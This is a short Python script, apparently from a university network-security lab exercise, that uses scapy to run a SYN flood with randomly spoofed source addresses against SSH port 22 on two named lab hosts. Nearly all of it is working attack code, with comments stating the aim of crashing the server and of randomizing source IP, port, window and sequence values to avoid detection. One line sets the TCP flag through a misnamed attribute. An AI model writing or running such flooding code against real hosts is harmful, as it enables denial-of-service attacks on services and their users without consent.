import random
from scapy.all import *
import sys

dst_ip1 = "orval.netsec.seclab-bonn.de"
dst_ip2 = "chimay.netsec.seclab-bonn.de"
dst_port = 22

def synflood():
    global dst_ip1
    global dst_ip2
    global dst_port

    if (int(input("Please write 1 to attack orval and 2 to attack chimay: "))==1):
        dst_ip=dst_ip1
    else:
        dst_ip=dst_ip2


    #as we want the server to crash we have to perform our attack until he cant send any SA answers anymore
    while (True):
        #define everything needed
        ip_packet = IP()

        #as the server might be secured against repeated queries from the same ip and the same port we randomize this
        ip_packet.src = str(random.randint(0,255))
        for x in range (0, 3):
            ip_packet.src += "." + str(random.randint(0,255))

        ip_packet.dst = dst_ip

        
        tcp_packet = TCP()

        #user ports lie in (1024, 49151)
        tcp_packet.src = random.randint(1024, 49151)
        tcp_packet.dst = dst_port

        #we even radnomize window and sequence parameter as we dont need a spejcific parameter and 100  queries with the same parameter seem suspicious again
        #highest possible value for a window size is 65535 bytes, we dont need as much, we do not care much about responses, for us the following is enough
        tcp_packet.window = random.randint(1000, 10000)
        tcp_packet.seq = random.randint(1, 10000)

        #important, setting the flag to SYN to establish a connection
        tcp_packet.flag = "SYN"

        pkt = ip_packet/tcp_packet

        pkt.show()
       
        send(pkt, verbose = 0)
        print(".", end=" ", flush=True)

def main():
    synflood()

main()
